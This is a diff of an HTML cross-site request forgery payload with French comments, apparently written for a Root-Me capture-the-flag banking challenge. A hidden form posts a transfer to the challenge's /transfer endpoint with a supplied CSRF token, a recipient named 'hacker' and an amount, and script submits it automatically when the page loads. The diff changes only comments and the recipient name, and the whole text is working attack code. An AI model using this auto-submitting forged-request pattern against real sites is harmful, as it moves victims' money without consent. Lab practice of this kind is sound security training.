@@ -1,10 +1,10 @@
 <form id="malicious-form" action="https://bankme-2.challenges.pro.root-me.org/transfer" method="post">
-    <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6aGFja2VyOjk3"> <!-- Jeton CSRF de l'utilisateur ciblé -->
-    <input type="text" name="recipient" value="hacker2"> <!-- Ton compte -->
-    <input type="number" name="amount" value="1"> <!-- Montant à transférer -->
+    <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6aGFja2VyOjk3"> <!-- Jeton CSRF de hacker -->
+    <input type="text" name="recipient" value="hacker"> <!-- Le destinataire est hacker2 -->
+    <input type="number" name="amount" value="1"> <!-- Montant à envoyer -->
     <button type="submit">Send Money</button>
  </form>
  <script>
-    document.getElementById('malicious-form').submit(); // Soumettre automatiquement le formulaire
+    document.getElementById('malicious-form').submit(); // Soumet automatiquement le formulaire
  </script>
  
